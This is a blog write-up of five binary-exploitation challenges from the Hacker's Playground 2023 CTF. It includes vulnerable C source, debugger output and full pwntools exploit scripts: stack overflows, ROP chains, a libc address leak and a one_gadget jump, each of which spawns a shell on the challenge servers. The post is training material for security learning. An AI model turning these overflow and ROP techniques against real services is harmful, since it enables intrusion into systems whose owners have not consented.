---
layout: post
title: "Writeup Hacker's Playground 2023"
categories: Pwn
tags: Hacking Pwn
---

#Hacker's Playground 2023

This 'weekend' (12 hours, for me 4!) Samsung Research Security Team hosted a ctf, despite this weekend was full of events I decided to play solo the Samsun's one and at the end of the day I did 5/7 pwn challs (not too bad for a noob!).

<!--excerpt-->

Today I'll write about BOF101, BOF102, BOF103, BOF104 and 9end2outs...

# BOF101
The obvious ret2win challenge, but this time with a catch the program check if a variable is changed, and if so it exits...

```c
int main() {
	int check=0xdeadbeef;
	char name[140];
	printf("printflag()'s addr: %p\n", &printflag);
	printf("What is your name?\n: ");
	scanf("%s", name);	
	if (check != 0xdeadbeef){
		printf("[Warning!] BOF detected!\n");
		exit(0);
	}
	return 0;
}
```

Strategy: 
1) Find the offset
2) Overwrite the check memory with 0xdeadbeef
3) Call printflag()

Let's jump into gdb, I first set a breakpoint here:

    0x4012a4 <main+90>            cmp    dword ptr [rbp: 4], 0xdeadbeef

Then with `cyclic 200` I generated the pattern and when I reached the breakpoint I examined the near area of `$rbp-4`

    pwndbg> x/40gx $rbp-4
    0x7fffffffdecc:	0x6161617361616161	0x6161617461616161
    0x7fffffffdedc:	0x6161617561616161	0x6161617661616161
    0x7fffffffdeec:	0x6161617761616161	0x6161617861616161
    0x7fffffffdefc:	0x6161617961616161	0x5b44a00061616161
    0x7fffffffdf0c:	0xffffdfe8d7b5cdb5	0x0040124a00007fff
    0x7fffffffdf1c:	0x0000000000000000	0xf7ffd04000000000
    0x7fffffffdf2c:	0xe686a06500007fff	0x61cea065284a324a
    0x7fffffffdf3c:	0x00000000284a2230	0x0000000000007fff
    0x7fffffffdf4c:	0x0000000000000000	0xffffdfe800000000
    0x7fffffffdf5c:	0x0000000000007fff	0xde23cb0000000000
    0x7fffffffdf6c:	0x0000000057d99d22	0xf7c29e4000000000
    0x7fffffffdf7c:	0x0000000000007fff	0xffffdff800007fff
    0x7fffffffdf8c:	0xf7ffe2e000007fff	0x0000000000007fff
    0x7fffffffdf9c:	0x0000000000000000	0x0040111000000000
    0x7fffffffdfac:	0xffffdfe000000000	0x0000000000007fff
    0x7fffffffdfbc:	0x0000000000000000	0x0040113e00000000
    0x7fffffffdfcc:	0xffffdfd800000000	0x0000001c00007fff
    0x7fffffffdfdc:	0x0000000100000000	0xffffe33000000000
    0x7fffffffdfec:	0x0000000000007fff	0xffffe35000000000
    0x7fffffffdffc:	0xffffe36000007fff	0xffffe3cc00007fff
    pwndbg> cyclic -l 0x6161617361616161
    Finding cyclic pattern of 8 bytes: b'aaaasaaa' (hex: 0x6161616173616161)
    Found at offset 140

So we need to send 140 bytes of junk data then 0xdeadbeef, the ret (stack alignment) and finally printflag() address... A crucial part here is to determine the format of 0xdeadbeef, in particula we need to send ret and printflag as p64 but 0xdeadbeef as p32...
Here is the solve script:
```python
from pwn import *

elf = context.binary = ELF("./bof101")
ip, port = "bof101.sstf.site", 1337

off = 140
dead = p32(0xdeadbeef)
ret = p64(0x000000000040101a)
win = p64(elf.sym['printflag'])

#io = elf.process()
io = remote(ip, port)

pay = b"a"*140 + dead + ret + win

with open("pay", "wb") as f:
	f.write(pay)

io.sendline(pay)
io.interactive()
```

Flag = `SCTF{N0VV_U_AR3_B0F_3xpEr7}`

# BOF102
This chall was actually interesting, first because is a 32bit one (I played last on 32bits like months ago...) and also for the overwrite...
Let's analyze the code:
```c
char name[16];

void bofme() {
	char payload[16];

	puts("What's your name?");
	printf("Name > ");
	scanf("%16s", name);
	printf("Hello, %s.\n", name);

	puts("Do you wanna build a snowman?");
	printf(" > ");
	scanf("%s", payload);
	printf("!!!%s!!!\n", payload);
	puts("Good.");
}

int main() {
	system("echo 'Welcome to BOF 102!'");
	bofme();
	return 0;
}
```
So there is a system call at the start! we know that system will be in plt.
In the bofme function the vulnerability is in the second scanf `scanf("%s", payload);`, but there is no win function an hacky trick would be to call system with /bin/sh, we already have system we only need the /bin/sh string, because we are prompted for 2 input and the first is also used in printf, we know where it lies:

    pwndbg> disass main
    Dump of assembler code for function main:
       0x080485fb <+0>:	push   ebp
       0x080485fc <+1>:	mov    ebp,esp
       0x080485fe <+3>:	push   0x8048730
       0x08048603 <+8>:	call   0x8048430 <system@plt>
       0x08048608 <+13>:	add    esp,0x4
       0x0804860b <+16>:	call   0x804856b <bofme>
       0x08048610 <+21>:	mov    eax,0x0
       0x08048615 <+26>:	leave  
       0x08048616 <+27>:	ret    
    End of assembler dump.

System address: 0x8048430, then we exploit that name where our /bin/sh string will lay won't die at the end of bofme() because is a global value.

    0x80485a7 <bofme+60>    call   printf@plt                     <printf@plt>
            format: 0x80486ef ◂:  'Hello, %s.\n'
            vararg: 0x804a06c (name) ◂:  '/bin/sh'

So the solver script is:
```python
from pwn import *

elf = context.binary = ELF('bof102')
ip, port = "bof102.sstf.site", 1337

#io = elf.process()
io = remote(ip, port)

io.sendline("/bin/sh")

bin_sh = p32(0x804a06c)
fill = b"A"*4
system = p32(0x8048430)
pay = b"A"*20 + system + fill + bin_sh

io.sendline(pay)
io.interactive()
```
Flag = `SCTF{574ck_iS_g00d_bu7_d4n9erOu5}`

# BOF103 / BOF104
Tbh timezone was against me so I used autorop for two ez flag, but then I returned on them ...
Let's analyze them..
bof103.c
```c
unsigned long long key;

void useme(unsigned long long a, 
		unsigned long long b)
{
	key = a * b;
}

void bofme() {
	char name[16];
	puts("What's your name?");
	printf("Name > ");
	scanf("%s", name);
	printf("Bye, %s.\n", name);
}

int main() {
	system("echo 'Welcome to BOF 103!'");
	bofme();
	return 0;
}
```

Again system is present on the binary, there is a global variable 'key' that address can be easily identified  and can be used in 'useme()', the bofme() function has again a no-brainer buffer overflow...
Payload Strat:
offset: 24 (could check easily)
pop rdi; ret and "/bin/sh\x00" to set the first argument of useme
pop rsi; ret and p64(1) to set the second argument of useme
then again pop rdi; ret to set the first argument of system as key
p64(key) (can be found in gdb or with nm)
and last a call to system

Final Script:
```python
from pwn import *

elf = context.binary = ELF("./bof103")
#io = elf.process()
io = remote("bof103.sstf.site", 1337)

pay = b"A"*24
pay += p64(0x0000000000400723) # pop rdi; ret
pay += b"/bin/sh\x00"
pay += p64(0x00000000004006b8) # pop rsi; ret
pay += p64(1)
pay += p64(elf.sym['useme'])
pay += p64(0x0000000000400723) # pop rdi; ret
pay += p64(0x601058) # Key Address
pay += p64(elf.plt['system']) # System Function

io.sendline(pay)
io.interactive()
```

Flag = 

    SCTF{R0P_is_v3ry_p0w3rfuL_4nd_u5EfUl}

Now BOF104, no source code this time so I loaded it in dogbolt and I get:

    int64_t bofme()
    {
        void var_28; // char var_28[0x20];
        read(0, &var_28, 0x200);
        return puts(&var_28);
    }
    
    int32_t main(int32_t argc, char** argv, char** envp)
    {
        setvbuf(stdout, nullptr, 2, 0);
        setvbuf(stdin, nullptr, 1, 0);
        bofme();
        return 0;
    }

Seems like a ROP playground, this time no evident system or other fancy things...
We need to leak first thing first the libc base address (we also have a libc.so.6), we are going to leak the puts address and then subtracting it from the offset of our libc...

Leak Script
```python
from pwn import *

elf = context.binary = ELF("bof104")
libc = ELF("libc.so.6")
#io = elf.process()
io = remote("bof104.sstf.site", 1337)

#Leak Libc

payload = b"A"* 40
payload += p64(0x0000000000401263) # pop rdi; ret
payload += p64(elf.got['puts']) # we pass the address of puts to puts
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main']) # We need to return to main

io.sendline(payload)
io.recvline()
leak_address = u64(io.recvline()[:-1].ljust(8, b"\x00"))
libc.address = leak_address - libc.sym['puts']
log.info(f"Libc Base @ {hex(libc.address)}")

io.interactive()
```
Now we only need to assemble our second payload that calls system("/bin/sh"), with pwntools magic we can do:

    bin_sh = next(libc.search(b"/bin/sh\x00"))
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(bin_sh)

So the full exploit is:

```python
from pwn import *

elf = context.binary = ELF("bof104")
libc = ELF("libc.so.6")
#io = elf.process()
io = remote("bof104.sstf.site", 1337)

#Leak Libc

payload = b"A"* 40
payload += p64(0x0000000000401263) # pop rdi; ret
payload += p64(elf.got['puts']) # we pass the address of puts to puts
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main']) # We need to return to main

io.sendline(payload)
io.recvline()
leak_address = u64(io.recvline()[:-1].ljust(8, b"\x00"))
libc.address = leak_address - libc.sym['puts']
log.info(f"Libc Base @ {hex(libc.address)}")

#Shell
bin_sh = next(libc.search(b"/bin/sh\x00"))
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(bin_sh)

payload = b"A"*40
payload += rop.chain()

log.info(rop.dump())

io.sendline(payload)
io.interactive()
```

Flag = 

    SCTF{W3_c4n_Ov3rc0me_4SLR}

# 9end2outs

Again no sources, let's reverse it

There is this useful function that leak us address of libc function

    int showFuncAddr(unsigned long long a0)
    {
        unsigned long v0;  // [bp-0x40]
        char v1;  // [bp-0x39]
        char v2;  // [bp-0x38]
    
        printf(" > ");
        fgets(&v2, 0x20, stdin@GLIBC_2.2.5);
        if (v1 == 10)
            v1 = 0;
        v0 = dlsym(a0, &v2, &v2);
        if (v0)
        {
            printf(" Libc function '%s' is at %p.\n", (unsigned int)&v2, (unsigned int)v0);
            return;
        }
        printf(" Libc doesn't have function '%s'.\n", (unsigned int)&v2);
        return;
    }

An example

    $ ./9end2outs 
    You have only 3 chances to win the game.
    
    The 1st chacne: Get libc symbol info.
     > system
     Libc function 'system' is at 0x7ffff7c50d60.
We are given the opportunity to leak 2 functions, and then we have a overflow

    char var_40;
    fgets(&var_40, 0x10, stdin);
    char rbx = var_40;

   We can see that the buffer's size is 16, so we overwrite 8 bytes with junk, and you ask why, so those 16 bytes will be saved into rbp, and after some instructions we have:
   

    0x5555555554f9 <main+374>    call   rcx

   It seems likely that a one_gadget will help us in this situation!
   So we only need to understand which libc the program use...
   I leaked values like 'system', 'puts' and '__libc_start_main', I then inserted them into [libc.database](https://libc.rip/) , and I found that the libc was [libc6_2.35-0ubuntu3_amd64](https://libc.rip/download/libc6_2.35-0ubuntu3_amd64.so).

So let's script what we have achieved:
```python
from pwn import *
#context.log_level = 'debug'
elf = context.binary = ELF('9end2outs')
io = remote("2outs.sstf.site", 1337)
#io = elf.process()
libc = ELF("libc.so.6")
#Leak system
io.sendlineafter(b"> ", b'system')
io.recvuntil(b"is at ")
system = int(io.recvline().strip()[:-1], 16)
libc.address = system - libc.sym['system']
log.info(f"System: {hex(system)}")
#Leak puts
io.sendlineafter(b"> ", b'puts')
io.recvuntil(b"is at ")
puts = int(io.recvline().strip()[:-1], 16)
log.info(f"Puts: {hex(puts)}")
#Leak LIBC base address
log.info(f"LIBC: {hex(libc.address)}")
```

Then we have the one_gadget;

    $ one_gadget libc.so.6 
    0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
      rbp == NULL || (u16)[rbp] == NULL
    
    0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
    constraints:
      address rbp-0x78 is writable
      [r10] == NULL || r10 == NULL
      [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
    
    0xebcf5 execve("/bin/sh", r10, rdx)
    constraints:
      address rbp-0x78 is writable
      [r10] == NULL || r10 == NULL
      [rdx] == NULL || rdx == NULL
    
    0xebcf8 execve("/bin/sh", rsi, rdx)
    constraints:
      address rbp-0x78 is writable
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL

I chose the last one, and the full exploit is:
```python
from pwn import *
#context.log_level = 'debug'
elf = context.binary = ELF('9end2outs')
io = remote("2outs.sstf.site", 1337)
#io = elf.process()
libc = ELF("libc.so.6")
#Leak system
io.sendlineafter(b"> ", b'system')
io.recvuntil(b"is at ")
system = int(io.recvline().strip()[:-1], 16)
libc.address = system - libc.sym['system']
log.info(f"System: {hex(system)}")
#Leak puts
io.sendlineafter(b"> ", b'puts')
io.recvuntil(b"is at ")
puts = int(io.recvline().strip()[:-1], 16)
log.info(f"Puts: {hex(puts)}")
#Leak LIBC base address
log.info(f"LIBC: {hex(libc.address)}")
#XPL
one_gadget = 0xebcf8
io.sendlineafter(b"> ", b'A' * 8 + p64(libc.address + one_gadget))
io.interactive()
```

Flag = `SCTF{c0ngr47s_y0u_R_Th3_MVP_0f_th15_94m3}`

Thanks for reading!
